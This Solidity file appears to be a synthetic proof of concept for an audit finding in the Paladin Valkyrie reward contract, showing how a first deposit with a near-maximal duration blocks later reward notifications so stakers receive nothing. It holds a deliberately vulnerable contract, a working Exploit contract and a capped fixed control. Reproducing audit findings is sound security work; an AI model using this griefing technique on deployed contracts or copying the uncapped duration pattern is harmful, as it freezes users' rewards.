// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Paladin Valkyrie — a long first reward distribution blocks the next one
    (Cyfrin / Draiakoo, finding #61557, 12 March 2025).

    SYNTHETIC, cheatcode-free. `nowTs` stands in for `block.timestamp` because
    the playground is a single block. The extension writes
    `endTimestamp = uint32(now + newDuration)`. A first duration of
    `uint32.max - 1 - now` makes that cast revert, so a later notify of
    N = 100 RWD never lands and the staker is paid 0.
    Control caps duration at 4 weeks, so the second notify pays the staker. */

contract Token {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        require(allowance[from][msg.sender] >= amount, "allow");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Logic {
    struct RewardData {
        uint96 ratePerSec;
        uint32 lastUpdateTime;
        uint32 endTimestamp;
    }

    Token public reward;
    uint256 public nowTs;
    uint256 public totalLiquidity;
    mapping(address => uint256) public userLiquidity;
    RewardData public rewardData;

    constructor(Token _reward) {
        reward = _reward;
        nowTs = 1_700_000_000;
    }

    function advance(uint256 dt) external {
        nowTs += dt;
    }

    function stake(uint256 amount) external {
        totalLiquidity += amount;
        userLiquidity[msg.sender] += amount;
    }

    function depositRewards(uint256 amount, uint256 duration) external {
        require(duration >= 1 weeks, "duration");
        reward.transferFrom(msg.sender, address(this), amount);
        uint32 endTimestampCache = rewardData.endTimestamp;
        if (endTimestampCache < nowTs) {
            uint256 rate = amount / duration;
            rewardData.ratePerSec = uint96(rate);
            rewardData.endTimestamp = uint32(nowTs + duration);
            rewardData.lastUpdateTime = uint32(nowTs);
        } else {
            uint256 remainingDuration = uint256(endTimestampCache) - nowTs;
            uint256 newDuration = remainingDuration + duration;
            uint256 leftoverRewards = uint256(rewardData.ratePerSec) * remainingDuration;
            uint256 newRate = (amount + leftoverRewards) / newDuration;
            require(newRate >= rewardData.ratePerSec, "rate");
            rewardData.ratePerSec = uint96(newRate);
            uint256 endRaw = nowTs + newDuration;
            // @> VULN: the extended end is cast to uint32 and reverts when the first duration filled the type
            require(endRaw <= uint256(type(uint32).max), "uint32");
            // FIX: cap duration so now + newDuration always fits in uint32
            rewardData.endTimestamp = uint32(endRaw);
            rewardData.lastUpdateTime = uint32(nowTs);
        }
    }

    function claim() external returns (uint256 paid) {
        paid = _earned(msg.sender);
        if (paid != 0) reward.transfer(msg.sender, paid);
    }

    function _earned(address account) internal view returns (uint256) {
        if (userLiquidity[account] == 0 || totalLiquidity == 0 || rewardData.ratePerSec == 0) return 0;
        uint256 applicable = nowTs < rewardData.endTimestamp ? nowTs : rewardData.endTimestamp;
        uint256 dt = applicable - rewardData.lastUpdateTime;
        return (dt * rewardData.ratePerSec * userLiquidity[account]) / totalLiquidity;
    }
}

contract Funder {
    function notify(Logic logic, Token reward, uint256 amount, uint256 duration) external returns (bool) {
        reward.approve(address(logic), amount);
        try logic.depositRewards(amount, duration) {
            return true;
        } catch {
            return false;
        }
    }
}

contract Exploit {
    uint256 public constant N = 100 ether;

    Token public reward;
    Logic public logic;
    Funder public funder;
    bool public secondReverted;
    uint256 public paid;
    uint256 public held;
    uint32 public firstEnd;

    constructor() {
        reward = new Token("Reward", "RWD", 18); // nonce 1
        logic = new Logic(reward); // nonce 2
        funder = new Funder(); // nonce 3
    }

    function run() external {
        logic.stake(1 ether);
        uint256 griefDuration = uint256(type(uint32).max) - 1 - logic.nowTs();
        reward.mint(address(this), 1);
        reward.approve(address(logic), 1);
        logic.depositRewards(1, griefDuration);
        (,, firstEnd) = logic.rewardData();
        require(firstEnd == type(uint32).max - 1, "grief end");
        logic.advance(3 days);
        reward.mint(address(funder), N);
        bool accepted = funder.notify(logic, reward, N, 1 weeks);
        secondReverted = !accepted;
        paid = logic.claim();
        held = reward.balanceOf(address(funder));
        require(secondReverted, "second notify did not revert");
        require(paid == 0, "staker was paid");
        require(held == N, "N was distributed");
    }
}

/// @dev Control: duration is capped at 4 weeks, so a second notify fits in uint32
///      and the sole staker is paid the streamed amount.
contract LogicFixed {
    struct RewardData {
        uint96 ratePerSec;
        uint32 lastUpdateTime;
        uint32 endTimestamp;
    }

    Token public reward;
    uint256 public nowTs;
    uint256 public totalLiquidity;
    mapping(address => uint256) public userLiquidity;
    RewardData public rewardData;

    constructor(Token _reward) {
        reward = _reward;
        nowTs = 1_700_000_000;
    }

    function advance(uint256 dt) external {
        nowTs += dt;
    }

    function stake(uint256 amount) external {
        totalLiquidity += amount;
        userLiquidity[msg.sender] += amount;
    }

    function depositRewards(uint256 amount, uint256 duration) external {
        require(duration >= 1 weeks && duration <= 4 weeks, "cap");
        reward.transferFrom(msg.sender, address(this), amount);
        uint32 endTimestampCache = rewardData.endTimestamp;
        if (endTimestampCache < nowTs) {
            uint256 rate = amount / duration;
            rewardData.ratePerSec = uint96(rate);
            rewardData.endTimestamp = uint32(nowTs + duration);
            rewardData.lastUpdateTime = uint32(nowTs);
        } else {
            uint256 remainingDuration = uint256(endTimestampCache) - nowTs;
            uint256 newDuration = remainingDuration + duration;
            uint256 leftoverRewards = uint256(rewardData.ratePerSec) * remainingDuration;
            uint256 newRate = (amount + leftoverRewards) / newDuration;
            require(newRate >= rewardData.ratePerSec, "rate");
            rewardData.ratePerSec = uint96(newRate);
            uint256 endRaw = nowTs + newDuration;
            require(endRaw <= uint256(type(uint32).max), "uint32");
            rewardData.endTimestamp = uint32(endRaw);
            rewardData.lastUpdateTime = uint32(nowTs);
        }
    }

    function claim() external returns (uint256 paid) {
        if (userLiquidity[msg.sender] == 0 || totalLiquidity == 0 || rewardData.ratePerSec == 0) return 0;
        uint256 applicable = nowTs < rewardData.endTimestamp ? nowTs : rewardData.endTimestamp;
        uint256 dt = applicable - rewardData.lastUpdateTime;
        paid = (dt * rewardData.ratePerSec * userLiquidity[msg.sender]) / totalLiquidity;
        if (paid != 0) reward.transfer(msg.sender, paid);
        rewardData.lastUpdateTime = uint32(applicable);
    }
}
